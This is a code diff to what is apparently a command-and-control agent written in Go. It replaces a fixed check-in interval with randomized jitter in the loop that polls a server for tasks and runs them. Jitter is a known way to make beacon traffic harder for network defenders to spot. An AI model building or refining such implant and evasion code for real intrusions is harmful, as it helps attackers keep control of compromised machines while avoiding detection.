@@ -9,7 +9,6 @@ import (
 	"os"
 	"runtime"
 	"strings"
-	"time"
 
 	"c2-agent/funcs"
 )
@@ -41,13 +40,13 @@ func main() {
 	hostname, _ := os.Hostname()
 	agentOS := runtime.GOOS
 
-	fmt.Printf("\n[*] Starting check-in loop (every %s)…\n\n", CheckInInterval)
+	fmt.Printf("\n[*] Starting check-in loop (jitter: %s – %s)…\n\n", JitterMin, JitterMax)
 
 	for {
 		tasks, err := checkIn(hostname, agentOS)
 		if err != nil {
 			fmt.Printf("[!] Check-in failed: %v\n", err)
-			time.Sleep(CheckInInterval)
+			funcs.SleepWithJitter(JitterMin, JitterMax)
 			continue
 		}
 
@@ -117,7 +116,7 @@ func main() {
 			}(task)
 		}
 
-		time.Sleep(CheckInInterval)
+		funcs.SleepWithJitter(JitterMin, JitterMax)
 	}
 }
 
